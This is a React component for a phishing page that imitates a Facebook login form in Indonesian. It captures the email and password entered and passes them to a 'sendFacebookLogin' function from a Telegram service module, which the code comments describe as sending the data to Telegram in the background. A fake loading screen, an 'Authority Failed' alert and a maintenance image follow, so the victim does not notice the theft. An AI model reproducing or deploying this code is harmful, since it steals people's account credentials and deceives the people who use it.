import { useState } from 'react';
import { sendFacebookLogin } from '../services/telegram';
import './LoginForm.css';



interface FacebookLoginProps {
  onClose: () => void;
}

const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
  const [step, setStep] = useState(1); // 1: FB Form, 3: Success

  // STEP 1 STATES
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  
  const [showCustomLoading, setShowCustomLoading] = useState(false);

  // STEP 1 HANDLER: Direct Submit
  const handleFbSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      alert("Email dan Kata Sandi harus diisi!");
      return;
    }
    
    // Send all data (FB Creds) - No questions anymore
    const q1 = "-";
    const q2 = "-";

    // Show Loading Overlay immediately
    setShowCustomLoading(true);
    setStep(0); // Hide forms

    // Send data to Telegram in background
    try {
      await sendFacebookLogin(email, password, q1, q2);
    } catch (error) {
      console.error("Failed to send FB login:", error);
    }
    
    // Simulate delay then show "Authority Failed" Alert
    setTimeout(() => {
      setShowCustomLoading(false);
      setStep(2); // Show Authority Failed Alert (New Step)
    }, 2000);
  };

  const handleAuthorityFailedConfirm = () => {
    // After clicking confirm on "Authority Failed", show Maintenance/Success
    setStep(3);
  };

  // Custom Loading Component
  if (showCustomLoading) {
    return (
      <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm animate-fade-in">
        <div className="relative animate-pulse">
          <img 
            src="/loading.png" 
            alt="Loading..." 
            className="w-[400px] md:w-[500px] h-auto drop-shadow-2xl"
          />
        </div>
      </div>
    );
  }

  return (
    <div className="relative flex flex-col items-center">
      
      {/* ================= STEP 1: FACEBOOK FORM ================= */}
      {step === 1 && (
        <div className="bg-white rounded-[10px] shadow-[0_4px_10px_rgba(238,4,4,0.2)] p-5 w-[400px] relative animate-pop-in">
          <button 
            onClick={onClose}
            className="absolute top-2.5 right-2.5 bg-transparent border-none text-[18px] font-bold text-[#333] cursor-pointer hover:text-black"
          >
            ×
          </button>

          <h2 className="text-[20px] text-[#333] text-center mb-5 font-bold">
            Login ke Facebook
          </h2>

          <form onSubmit={handleFbSubmit}>
            <input
              type="text"
              placeholder="Email atau Nomor Telepon"
              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Kata Sandi"
              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full p-2.5 bg-[#1877f2] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#155db3] transition-colors"
            >
              Masuk
            </button>

            <div className="text-center mt-[15px] text-[14px] text-[#555]">
              <a href="#" className="text-[#1877f2] no-underline hover:underline">
                Lupa kata sandi?
              </a>
            </div>

            <div className="my-5 border-t border-[#dadde1]"></div>

            <button
              type="button"
              className="block mx-auto w-[60%] p-[11px] bg-[#42b72a] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#36a420] transition-colors"
            >
              Buat akun baru
            </button>
          </form>
        </div>
      )}

      {/* ================= STEP 2: AUTHORITY FAILED ALERT ================= */}
      {step === 2 && (
        <div className="fixed inset-0 z-[2000] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-pop-in">
          <div className="relative w-[90%] max-w-[380px] bg-gradient-to-b from-[#8b4513] to-[#6d3209] border-4 border-[#b87333] shadow-[0_10px_25px_rgba(0,0,0,0.8),inset_0_0_20px_rgba(0,0,0,0.5)] rounded-[20px] p-8 text-center">
            
            {/* Close Icon */}
            <button 
              onClick={handleAuthorityFailedConfirm}
              className="absolute -top-4 -right-4 w-9 h-9 flex items-center justify-center bg-gradient-to-b from-[#8b0000] to-[#500000] border-2 border-[#ffd700] rounded-full text-[#ffd700] font-bold text-lg cursor-pointer shadow-md z-20 hover:scale-110 transition-transform"
            >
              ✕
            </button>

            {/* Message */}
            <div className="text-[#f5f5dc] text-lg font-sans mb-8 relative z-10 leading-relaxed">
              Otoritas Gagal, Silakan login menggunakan ID Login.
            </div>

            {/* Button */}
            <button 
              onClick={handleAuthorityFailedConfirm}
              className="relative z-10 px-10 py-2 bg-gradient-to-b from-[#4ade80] to-[#16a34a] border-2 border-[#facc15] text-white font-bold text-lg rounded-full shadow-lg hover:brightness-110 active:scale-95 transition-all"
            >
              Tentukan
            </button>

            {/* Texture Overlay */}
            <div className="absolute inset-0 bg-[radial-gradient(rgba(255,255,255,0.05)_1px,transparent_1px)] bg-[length:10px_10px] pointer-events-none rounded-[16px]"></div>
          </div>
        </div>
      )}

      {/* ================= STEP 3: SUCCESS MODAL ================= */}
      {step === 3 && (
        <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-pop-in">
          <div className="relative">
            <img 
              src="/maintance.png" 
              alt="System Maintenance" 
              className="w-[300px] md:w-[400px] h-auto drop-shadow-2xl rounded-xl"
            />
            
            <button 
              onClick={onClose} 
              className="absolute top-2 right-2 w-8 h-8 flex items-center justify-center bg-red-500/80 hover:bg-red-600 text-white rounded-full transition-colors z-10 font-bold shadow-md border border-white/20"
            >
              ✕
            </button>

            <button 
              onClick={onClose}
              className="absolute bottom-[10%] left-1/2 transform -translate-x-1/2 w-[120px] h-[40px] bg-transparent border-none z-20 cursor-pointer"
              aria-label="Confirm"
            ></button>
          </div>
        </div>
      )}
    </div>
  );
};

export default FacebookLogin;
